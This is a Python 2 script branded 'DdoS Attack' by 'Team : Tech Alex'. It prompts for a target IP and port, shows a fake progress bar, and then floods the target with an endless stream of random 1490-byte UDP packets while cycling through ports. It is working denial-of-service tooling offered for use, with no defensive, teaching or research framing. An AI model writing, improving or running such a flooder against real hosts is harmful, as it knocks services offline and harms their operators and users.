import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print ("")
print ("\033[92m")
ip = raw_input("IP Target : ")
answer = str(input("Do You want to enter port? [Yes(1)/No(2)] : "))
if answer == "1":
    port = int(input("Enter Port : "))
    os.system("clear")
    print("\033[93m")
    os.system("figlet DdoS Attack | lolcat")
    print ("\E[32mTeam : Tech Alex")
    print ("\033[92m")
    print ("[                    ] 0% ")
    time.sleep(2)
    print ("[=====               ] 25%")
    time.sleep(2)
    print ("[==========          ] 50%")
    time.sleep(2)
    print ("[===============     ] 75%")
    time.sleep(2)
    print ("[====================] 100%")
    time.sleep(2)
    sent = 0
    while True:
     sock.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

elif answer == "2":
    port = 80
    print ("Your Default Port Is : 80")
    os.system("clear")
    print("\033[93m")
    os.system("figlet DdoS Attack | lolcat")
    print("Team : Tech Alex")
    print ("\033[92m")
    print ("[                    ] 0% ")
    time.sleep(3)
    print ("[=====               ] 25%")
    time.sleep(3)
    print ("[==========          ] 50%")
    time.sleep(3)
    print ("[===============     ] 75%")
    time.sleep(3)
    print ("[====================] 100%")
    time.sleep(1)
    sent = 0
    while True:
      sock.sendto(bytes,(ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
else:
    print ("Invalid Option")
